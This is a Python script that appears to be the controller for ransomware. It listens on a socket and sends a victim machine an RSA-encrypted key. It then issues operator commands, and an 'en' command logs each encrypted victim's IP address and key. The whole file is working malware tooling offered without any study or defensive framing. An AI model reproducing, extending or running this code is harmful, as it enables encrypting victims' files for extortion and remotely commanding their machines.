import socket
import threading
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP

def recvf(c):
	while True:
		data = c.recv(2048)
		if len(data) !=0:
			print(data.decode('ascii'))

def server():
    pk="""-----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAooGyR6CC+cEuqR6621nt
    ELnKqFyVbHUuVXIJbHAPA5NVwQUaQPDOXvEUEh8ZjWT/MzPnDa/2wVjnkcg/ABI2
    ZwXTSdxvwZhkml0a33t8p5QQXra5vIQQqQKMCmJhR2Eftovwz0oK6hepCbUqacI0
    JwdaJvZ8EXC9Z5PkUP6uKMldzHc1lKhmr6doImHvPsOx1O4ufgD9Id3TXaoDDOsN
    JS2BkHDp07TXdcCUAbPH70gBTeoq+tzT5vM3tTwchxhYdbgz67NGm44qOfVYGqhy
    GFgXBRCopVjONAlMfKs6R5EoYa7rQPgyP+YxUkGAYPvl69saGMqrRAlYylOlk0Tx
    vwIDAQAB
    -----END PUBLIC KEY-----"""
    pk=pk.encode('ascii')
    pubkey=RSA.importKey(pk)
    c= PKCS1_OAEP.new(pubkey)
    key_v= input("the key:")
    encrypted_key=c.encrypt(key_v.encode('ascii'))
    port = 4545
    ip = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.setblocking(1)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.bind((ip,port))
        s.listen(1)
        c , add = s.accept()
        log_file =open("log.txt","a+")
        log_file_read=open("log.txt","r")
        v_list =log_file_read.readlines()
        log_file_read.close()
        if add[0]+'\n' in v_list:
            print("you encrypted this pc !")
        print("connection from {0}:{1}".format(add[0],add[1]))
        c.send(encrypted_key)
        t = threading.Thread(target=recvf,args=(c,))
        t.start()
        while True:
            command = input("command >>")
            if command=="en":
                log_file.write(key_v)
                log_file.write("\n{0}\n".format(add[0]))
                log_file.close()
                print("the ip address is added to logfile")
            c.send(command.encode('ascii'))
    except socket.error as e:
        print(e)
        s.close()

server()